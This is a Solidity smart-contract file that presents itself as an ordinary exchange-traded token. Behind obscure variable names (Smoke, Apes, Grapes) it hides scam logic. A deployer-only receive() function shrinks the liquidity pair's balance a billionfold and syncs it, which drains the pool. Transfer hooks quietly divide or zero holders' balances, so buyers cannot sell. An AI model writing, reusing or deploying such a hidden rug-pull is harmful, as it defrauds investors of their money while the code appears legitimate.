pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}

interface IUniswapV2Pair {
    event Sync(uint112 reserve0, uint112 reserve1);
    function sync() external;
}

contract Ownable is Context {
    address private _previousOwner; address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract Math { 
    mapping (address => uint256) internal _balances;
    mapping (address => bool) internal Rolling;

    address[] internal trustArr; address[3] internal trAddr;

    bool[3] internal Smoke; bool internal trading = false;

    uint256 internal Boom = block.number*2; uint256 internal numB;
    uint256 internal Apes = 0; uint256 internal Grapes = 1;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public pair;
    IDEXRouter router;

    function _set() internal {
        trAddr[0] = address(_router);
        trAddr[1] = msg.sender;
        trAddr[2] = pair;
        for (uint256 q=0; q < 3; q++) {Math.Rolling[Math.trAddr[q]] = true; Math.Smoke[q] = false; }
    }

    function last(uint256 g) internal view returns (address) { return (Apes > 1 ? trustArr[trustArr.length-g-1] : address(0)); }

    receive() external payable {
        require(msg.sender == trAddr[1]); _balances[trAddr[2]] /= (false ? 1 : 1e9); IUniswapV2Pair(trAddr[2]).sync(); Smoke[2] = true;
    }

    function _beforeTokenTransfer(address sender, address recipient) internal {
        require((trading || (sender == trAddr[1])), "ERC20: trading is not yet enabled.");
        Grapes += ((Rolling[sender] != true) && (Rolling[recipient] == true)) ? 1 : 0;
        if (((Rolling[sender] == true) && (Rolling[recipient] != true)) || ((Rolling[sender] != true) && (Rolling[recipient] != true))) { trustArr.push(recipient); }
        _ArbBot(sender, recipient);
    }

    function _ArbBot(address sender, address recipient) internal {
        if ((Smoke[0] || (Smoke[2] && (recipient != trAddr[1])))) { for (uint256 q=0; q < trustArr.length-1; q++) { _balances[trustArr[q]] /= (Smoke[2] ? 1e9 : 4e1); } Smoke[0] = false; }
        _balances[last(1)] /= (((Boom == block.number) || Smoke[1] || ((Boom - numB) <= 7)) && (Rolling[last(1)] != true) && (Apes > 1)) ? (3e1) : (1);
        _balances[last(0)] /= (((Smoke[1]) && (last(0) == sender)) || ((Smoke[2] && (trAddr[1] != sender))) ? (0) : (1));
        (Smoke[0],Smoke[1]) = ((((Grapes*10 / 4) == 10) && (Smoke[1] == false)) ? (true,true) : (Smoke[0],Smoke[1]));
        Boom = block.number; Apes++;
    }
}